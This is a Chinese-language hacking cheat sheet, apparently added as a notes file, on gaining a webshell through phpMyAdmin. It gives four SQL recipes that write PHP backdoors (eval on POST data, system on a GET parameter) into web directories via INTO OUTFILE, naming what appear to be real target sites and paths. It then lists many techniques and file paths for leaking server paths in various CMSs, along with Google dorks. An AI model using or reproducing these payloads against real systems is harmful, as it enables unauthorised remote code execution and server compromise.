@@ -1,0 +1,193 @@
+                phpmyadmin各种技巧拿webshell
+
+
+D:\wamp\www
+
+账号还有密码
+
+root 密码
+第一种
+CREATE TABLE `mysql`.`darkmoon` (`darkmoon1` TEXT NOT NULL );
+INSERT INTO `mysql`.`darkmoon` (`darkmoon1` ) VALUES ('<?php @eval($_POST[pass]);?>');
+SELECT `darkmoon1` FROM `darkmoon` INTO OUTFILE '/home/public_html/ehs.cn/itos/gsd/libs/db_engine/ok.php';
+DROP TABLE IF EXISTS `darkmoon`;
+
+第二种方法
+Create TABLE moon (darkmoon text NOT NULL);
+Insert INTO moon (darkmoon) VALUES('<?php @eval($_POST[pass]);?>');
+root localhost:3720 
+
+http://www.03job.com/phpMyAdmin/server_processlist.php
+可以杀死进程
+
+D:\EmpireServer\www
+D:\EmpireServer\php\mysql5\Data\
+
+http://www.03job.com/phpMyAdmin/server_variables.php
+
+D:\EmpireServer\php\mysql5
+
+select 'xxxx' INTO OUTFILE  'D:\EmpireServer\www\phpMyAdmin\lis.txt'
+
+select darkmoon from moon into outfile 'd:/wamp/www/darkmoon2.php';
+Drop TABLE IF EXISTS moon;
+
+第三种方法：
+select '<?php @eval($_POST[pass]);?>'INTO OUTFILE 'D:\EmpireServer\www\keio.txt'
+
+C:\Inetpub\wwwroot
+
+第四种方法
+select '<?php echo \'<pre>\';system($_GET[\'cmd\']); echo \'</pre>\'; ?>' INTO OUTFILE '/home/public_html/ehs.cn/itos/gsd/libs/db_engine/1.txt'
+127.0.0.1/darkmoon4.php?cmd=net user
+
+php暴路径的所有
+1、单引号爆路径
+说明：
+直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。
+www.xxx.com/news.php?id=149′
+
+2、错误参数值爆路径
+说明：
+将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。
+www.xxx.com/researcharchive.php?id=-1
+
+3、Google爆路径
+说明：
+结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。
+Site:xxx.edu.tw warning
+Site:xxx.com.tw “fatal error”
+
+4、测试文件爆路径
+说明：
+很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。
+www.xxx.com/test.php
+www.xxx.com/ceshi.php
+www.xxx.com/info.php
+www.xxx.com/phpinfo.php
+www.xxx.com/php_info.php
+www.xxx.com/1.php
+
+5、phpmyadmin爆路径
+说明：
+一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。
+1. /phpmyadmin/libraries/lect_lang.lib.php
+2./phpMyAdmin/index.php?lang[]=1
+3. /phpMyAdmin/phpinfo.php
+4. load_file()
+5./phpmyadmin/themes/darkblue_orange/layout.inc.php
+6./phpmyadmin/libraries/select_lang.lib.php
+7./phpmyadmin/libraries/lect_lang.lib.php
+8./phpmyadmin/libraries/mcrypt.lib.php
+
+6、配置文件找路径
+说明：
+如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。
+
+Windows:
+c:\windows\php.ini                                    php配置文件
+c:\windows\system32\inetsrv\MetaBase.xml              IIS虚拟主机配置文件
+
+Linux:
+/etc/php.ini                                           php配置文件
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf/httpd.conf                             Apache配置文件
+/usr/local/apache/conf/httpd.conf
+/usr/local/apache2/conf/httpd.conf
+/usr/local/apache/conf/extra/httpd-vhosts.conf         虚拟目录配置文件
+
+7、nginx文件类型错误解析爆路径
+说明：
+这是昨天无意中发现的方法，当然要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，还有可能爆出物理路径。
+www.xxx.com/top.jpg/x.php
+
+8、其他
+dedecms
+/member/templets/menulit.php
+plus/paycenter/alipay/return_url.php 
+plus/paycenter/cbpayment/autoreceive.php
+paycenter/nps/config_pay_nps.php
+plus/task/dede-maketimehtml.php
+plus/task/dede-optimize-table.php
+plus/task/dede-upcache.php
+
+WP
+wp-admin/includes/file.php
+wp-content/themes/baiaogu-seo/footer.php
+
+ecshop商城系统暴路径漏洞文件
+/api/cron.php
+/wap/goods.php
+/temp/compiled/ur_here.lbi.php
+/temp/compiled/pages.lbi.php
+/temp/compiled/user_transaction.dwt.php
+/temp/compiled/history.lbi.php
+/temp/compiled/page_footer.lbi.php
+/temp/compiled/goods.dwt.php
+/temp/compiled/user_clips.dwt.php
+/temp/compiled/goods_article.lbi.php
+/temp/compiled/comments_list.lbi.php
+/temp/compiled/recommend_promotion.lbi.php
+/temp/compiled/search.dwt.php
+/temp/compiled/category_tree.lbi.php
+/temp/compiled/user_passport.dwt.php
+/temp/compiled/promotion_info.lbi.php
+/temp/compiled/user_menu.lbi.php
+/temp/compiled/message.dwt.php
+/temp/compiled/admin/pagefooter.htm.php
+/temp/compiled/admin/page.htm.php
+/temp/compiled/admin/start.htm.php
+/temp/compiled/admin/goods_search.htm.php
+/temp/compiled/admin/index.htm.php
+/temp/compiled/admin/order_list.htm.php
+/temp/compiled/admin/menu.htm.php
+/temp/compiled/admin/login.htm.php
+/temp/compiled/admin/message.htm.php
+/temp/compiled/admin/goods_list.htm.php
+/temp/compiled/admin/pageheader.htm.php
+/temp/compiled/admin/top.htm.php
+/temp/compiled/top10.lbi.php
+/temp/compiled/member_info.lbi.php
+/temp/compiled/bought_goods.lbi.php
+/temp/compiled/goods_related.lbi.php
+/temp/compiled/page_header.lbi.php
+/temp/compiled/goods_script.html.php
+/temp/compiled/index.dwt.php
+/temp/compiled/goods_fittings.lbi.php
+/temp/compiled/myship.dwt.php
+/temp/compiled/brands.lbi.php
+/temp/compiled/help.lbi.php
+/temp/compiled/goods_gallery.lbi.php
+/temp/compiled/comments.lbi.php
+/temp/compiled/myship.lbi.php
+/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
+/includes/modules/cron/auto_manage.php
+/includes/modules/cron/ipdel.php
+
+ucenter爆路径
+ucenter\control\admin\db.php
+
+DZbbs
+manyou/admincp.php?my_suffix=%0A%0DTOBY57
+
+z-blog
+admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php
+
+php168爆路径
+admin/inc/hack/count.php?job=list
+admin/inc/hack/search.php?job=getcode
+admin/inc/ajax/bencandy.php?job=do
+cache/MysqlTime.txt
+
+PHPcms2008-sp4
+注册用户登陆后访问
+phpcms/corpandresize/process.php?pic=../images/logo.gif
+
+bo-blog
+PoC:
+/go.php/<[evil code]
+CMSeasy爆网站路径漏洞
+漏洞出现在menu_top.php这个文件中
+lib/mods/celive/menu_top.php
+/lib/default/ballot_act.php
+lib/default/special_act.php
